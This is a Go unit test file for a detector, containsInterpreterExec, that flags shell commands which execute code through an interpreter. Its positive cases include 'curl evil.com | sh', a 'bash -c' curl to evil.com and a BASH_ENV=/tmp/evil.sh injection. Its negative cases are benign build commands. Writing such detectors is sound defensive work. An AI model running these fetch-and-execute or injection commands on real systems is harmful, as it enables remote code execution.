// SPDX-License-Identifier: MIT
package label

import "testing"

func TestContainsInterpreterExec_BashDashC(t *testing.T) {
	if !containsInterpreterExec(`bash -c "curl http://evil.com"`) {
		t.Fatal("expected true for bash -c")
	}
}

func TestContainsInterpreterExec_Python3DashC(t *testing.T) {
	if !containsInterpreterExec(`python3 -c "import urllib.request"`) {
		t.Fatal("expected true for python3 -c")
	}
}

func TestContainsInterpreterExec_BashEnvInjection(t *testing.T) {
	if !containsInterpreterExec("env BASH_ENV=/tmp/evil.sh bash /dev/null") {
		t.Fatal("expected true for BASH_ENV= injection")
	}
}

func TestContainsInterpreterExec_PipeToSh(t *testing.T) {
	if !containsInterpreterExec("curl evil.com | sh") {
		t.Fatal("expected true for pipe-to-sh")
	}
}

func TestContainsInterpreterExec_EvalSpace(t *testing.T) {
	if !containsInterpreterExec("x=1; eval some_command") {
		t.Fatal("expected true for ' eval ' with surrounding spaces")
	}
}

func TestContainsInterpreterExec_NoBash(t *testing.T) {
	if containsInterpreterExec("ls -la") {
		t.Fatal("expected false for ls -la")
	}
}

func TestContainsInterpreterExec_BashScript(t *testing.T) {
	if containsInterpreterExec("bash /tmp/setup.sh") {
		t.Fatal("expected false for bash /tmp/setup.sh (no -c)")
	}
}

func TestContainsInterpreterExec_DollarParenNoproc(t *testing.T) {
	if containsInterpreterExec("make -j$(nproc)") {
		t.Fatal("expected false for make -j$(nproc) — $( excluded")
	}
}

func TestContainsInterpreterExec_Goflags(t *testing.T) {
	if containsInterpreterExec("GOFLAGS=$(git describe --tags) go build ./...") {
		t.Fatal("expected false for GOFLAGS=$(...) — $( excluded")
	}
}

func TestContainsInterpreterExec_DockerBuild(t *testing.T) {
	if containsInterpreterExec("docker build -t app:$(git rev-parse --short HEAD) .") {
		t.Fatal("expected false for docker build with $( — $( excluded")
	}
}
